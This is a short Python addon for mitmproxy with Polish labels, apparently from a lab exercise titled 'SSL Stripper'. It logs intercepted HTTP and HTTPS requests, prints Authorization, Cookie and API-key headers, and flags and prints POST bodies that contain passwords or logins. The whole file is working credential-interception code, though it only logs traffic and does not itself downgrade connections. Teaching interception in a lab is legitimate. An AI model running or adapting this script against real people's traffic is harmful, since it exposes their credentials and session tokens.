from mitmproxy import http
from datetime import datetime

class SSLStripperDemo:
    def __init__(self):
        self.request_count = 0
        self.https_stripped = 0
    
    def request(self, flow: http.HTTPFlow) -> None:
        self.request_count += 1
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        was_https = flow.request.scheme == "https"
        
        if was_https:
            self.https_stripped += 1
            print("\n" + "="*70)
            print(f"[SSL STRIPPING] ZADANIE #{self.https_stripped} ODSZYFROWANE")
            print("="*70)
        else:
            print(f"\n[{timestamp}] Zadanie #{self.request_count}")
        
        print(f"  URL: {flow.request.pretty_url}")
        print(f"  Metoda: {flow.request.method}")
        print(f"  Host: {flow.request.host}")
        print(f"  Schemat: {flow.request.scheme} {'(ODSZYFROWANE)' if was_https else ''}")
        
        print(f"\n  Naglowki:")
        for key, value in flow.request.headers.items():
            if key.lower() in ['authorization', 'cookie', 'x-api-key']:
                print(f"    [WRAZLIWE] {key}: {value}")
            else:
                print(f"    {key}: {value}")
        
        if flow.request.method == "POST":
            print(f"\n  Tresc POST:")
            try:
                content = flow.request.get_text()
                if 'password' in content.lower() or 'haslo' in content.lower():
                    print(f"    [HASLO PRZECHWYCONE]")
                if 'username' in content.lower() or 'login' in content.lower():
                    print(f"    [LOGIN PRZECHWYCONY]")
                print(f"    {content[:500]}")
            except:
                print(f"    [Dane binarne]")
        
        if was_https:
            print("="*70)
    
    def response(self, flow: http.HTTPFlow) -> None:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        print(f"\n[{timestamp}] Odpowiedz")
        print(f"  URL: {flow.request.pretty_url}")
        print(f"  Status: {flow.response.status_code}")
        print(f"  Typ: {flow.response.headers.get('content-type', 'nieznany')}")
        print(f"  Rozmiar: {len(flow.response.content)} bajtow")
        
        flow.response.headers["X-Przechwycone-Przez"] = "SSL-Stripper-Lab03"

addons = [SSLStripperDemo()]
